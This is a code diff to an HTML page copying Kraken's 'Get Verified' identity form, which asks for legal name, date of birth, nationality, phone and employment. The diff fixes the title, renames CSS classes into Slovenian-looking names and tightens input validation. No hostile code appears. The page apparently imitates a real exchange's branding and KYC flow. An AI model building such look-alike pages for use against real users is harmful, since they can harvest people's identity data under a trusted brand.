@@ -3,62 +3,62 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Get Verefied - Kraken</title>
+  <title>Get Verified - Kraken</title>
   <link rel="icon" type="image" href="../img/favicon.ico">
   <link rel="stylesheet" href="../css/style.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
 <body>
 
-  <!-- Global Header -->
-  <header class="global-header">
-    <a href="../index.html" class="logo-slot">
-      <img src="../img/logo-full.svg" class="logo-img">
+  <header class="glavni-header">
+    <a href="../index.html" class="polje-logotip">
+      <img src="../img/logo-full.svg" class="image-logotip">
     </a>
 
-    <div class="header-actions">
-      <label class="lang-pill">
-        <img src="../img/icons/globe.svg" alt="" class="lang-icon" width="16" height="16">
+    <div class="dejanja-header">
+      <label class="jezikovni-button">
+        <img src="../img/icons/globe.svg" alt="" class="icon-jezika" width="16" height="16">
       </label>
-      <a href="login.html" class="btn-header-light">Sign out</a>
+      <a href="login.html" class="button-header-svetel">Sign out</a>
     </div>
   </header>
 
-  <!-- Poll Step 1: Info Page 1 -->
-  <main class="flow-container">
-    <div class="sub-nav">
-      <a href="register-country.html" class="btn-back">‹ Back</a>
-      <a href="../index.html" class="btn-close" title="Exit">✕</a>
+  <main class="glavni-vsebnik">
+    <div class="pod-nav">
+      <a href="register-country.html" class="button-nazaj">‹ Back</a>
+      <a href="../index.html" class="button-zapri" title="Exit">✕</a>
     </div>
 
-    <div class="card text-left">
-      <h1 class="card-title-soft">Let's get you verified</h1>
-      <p class="card-sub">This information helps us verify your identity. We're legally required to collect this info. <a href="#">Learn more</a></p>
+    <div class="kartica besedilo-levo">
+      <h1 class="mehki-naslov-kartice">Let's get you verified</h1>
+      <p class="podnaslov-kartice">This information helps us verify your identity. We're legally required to collect this info. <a href="#">Learn more</a></p>
 
-      <h2 class="section-title">First and Last name</h2>
-      <p class="section-sub">Make sure your name and date of birth matches what's on your government-issued ID.</p>
+      <h2 class="naslov-razdelka">First and Last name</h2>
+      <p class="podnaslov-razdelka">Make sure your name and date of birth matches what's on your government-issued ID.</p>
 
       <form action="poll-2.html" method="GET" novalidate>
-        <div class="name-row">
-          <div class="name-col field-group">
-            <input type="text" id="fname" class="text-field" placeholder=" " autocomplete="given-name" required>
-            <label class="floating-label" for="fname">Legal first name (given name)</label>
-            <div class="field-error-msg">Missing required field</div>
+        <div class="vrstica-ime">
+          <div class="stolpec-ime skupina-polja">
+            <input type="text" id="fname" class="besedilno-polje" placeholder=" " autocomplete="given-name" minlength="2" maxlength="30" required>
+            <label class="lebdeca-label" for="fname">Legal first name (given name)</label>
+            <div class="sporocilo-napake">Missing required field</div>
           </div>
-          <div class="name-col field-group">
-            <input type="text" id="lname" class="text-field" placeholder=" " autocomplete="family-name" required>
-            <label class="floating-label" for="lname">Legal last name (surname)</label>
-            <div class="field-error-msg">Missing required field</div>
+          <div class="stolpec-ime skupina-polja">
+            <input type="text" id="lname" class="besedilno-polje" placeholder=" " autocomplete="family-name" minlength="2" maxlength="30" required>
+            <label class="lebdeca-label" for="lname">Legal last name (surname)</label>
+            <div class="sporocilo-napake">Missing required field</div>
           </div>
         </div>
 
-        <div class="field-group">
-          <input type="date" id="dob" class="text-field" required>
-          <label class="floating-label" for="dob">Date of birth</label>
+        <div class="skupina-polja">
+          <input type="date" id="dob" class="besedilno-polje" min="1900-01-01" max="2026-10-22" required>
+          <label class="lebdeca-label" for="dob">Date of birth</label>
+          <div class="sporocilo-napake">You must be at least 18 years old</div>
         </div>
 
-        <h2 class="section-title">Personal Info</h2>
-        <div class="field-group">
-          <select id="nationality-select" class="text-field" required>
+        <h2 class="naslov-razdelka">Personal Info</h2>
+        <div class="skupina-polja">
+          <select id="nationality-select" class="besedilno-polje spustno-polje-z-naslovom izbirno-polje" required>
             <option value="" disabled selected></option>
             <option value="">🇧🇻 </option>
             <option value="Afghan">🇦🇫 Afghan</option>
@@ -302,13 +302,13 @@
             <option value="Zimbabwean">🇿🇼 Zimbabwean</option>
             <option value="Ålandish">🇦🇽 Ålandish</option>
           </select>
-          <label class="floating-label" for="nationality-select">Nationality</label>
-          <div class="field-error-msg">Missing required field</div>
+          <label class="lebdeca-label" for="nationality-select">Nationality</label>
+          <div class="sporocilo-napake">Missing required field</div>
         </div>
 
-        <h2 class="section-title">Phone number</h2>
-        <div class="row phone-row">
-          <select class="phone-code text-field" id="phone-code" name="phone-code" aria-label="Country calling code">
+        <h2 class="naslov-razdelka">Phone number</h2>
+        <div class="vrstica vrstica-telefon">
+          <select class="koda-telefona besedilno-polje spustno-polje-brez-naslova izbirno-polje" id="phone-code" name="phone-code" aria-label="Country calling code">
             <option value="+93" title="Afghanistan">🇦🇫 +93</option>
             <option value="+355" title="Albania">🇦🇱 +355</option>
             <option value="+213" title="Algeria">🇩🇿 +213</option>
@@ -558,33 +558,32 @@
             <option value="+263" title="Zimbabwe">🇿🇼 +263</option>
             <option value="+35818" title="Åland Islands">🇦🇽 +35818</option>
           </select>
-          <div class="field-group col">
-            <input type="tel" id="phone" class="text-field" placeholder=" " required>
-            <label class="floating-label" for="phone">What is your phone number?</label>
-            <div class="field-error-msg">Please enter a valid phone number (5-15 digits)</div>
+          <div class="skupina-polja stolpec">
+            <input type="tel" id="phone" class="besedilno-polje" placeholder=" " minlength="5" maxlength="15" pattern="[0-9]{5,15}" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')" required>
+            <label class="lebdeca-label" for="phone">What is your phone number?</label>
+            <div class="sporocilo-napake">Please enter a valid phone number (5-15 digits)</div>
           </div>
         </div>
 
-        <h2 class="section-title">What is your employment status?</h2>
-        <p class="section-sub">If you're unsure, pick the closest fit.</p>
+        <h2 class="naslov-razdelka">What is your employment status?</h2>
+        <p class="podnaslov-razdelka">If you're unsure, pick the closest fit.</p>
 
-        <div class="radio-list">
-          <label class="radio-item"><input type="radio" name="opt" checked> <span>Employed</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>Unemployed</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>Retired</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>Student</span></label>
-          <label class="radio-item"><input type="radio" name="opt"> <span>Self-Employed or Business Owner</span></label>
+        <div class="seznam-izbir">
+          <label class="izbirni-element"><input type="radio" name="opt" checked> <span>Employed</span></label>
+          <label class="izbirni-element"><input type="radio" name="opt"> <span>Unemployed</span></label>
+          <label class="izbirni-element"><input type="radio" name="opt"> <span>Retired</span></label>
+          <label class="izbirni-element"><input type="radio" name="opt"> <span>Student</span></label>
+          <label class="izbirni-element"><input type="radio" name="opt"> <span>Self-Employed or Business Owner</span></label>
         </div>
 
-        <p class="disclaimer text-center">Local regulation requires us to ask.</p>
-        <button type="submit" class="btn btn-primary">Continue</button>
+        <p class="opozorilo besedilo-sredina">Local regulation requires us to ask.</p>
+        <button type="submit" class="button glavni-button">Continue</button>
       </form>
     </div>
   </main>
 
-  <!-- Global Footer -->
-  <footer class="global-footer">
-    <div class="footer-links">
+  <footer class="glavni-footer">
+    <div class="povezave-footer">
       <a href="#">Privacy Notice</a>
       <a href="#">Terms of Service</a>
     </div>
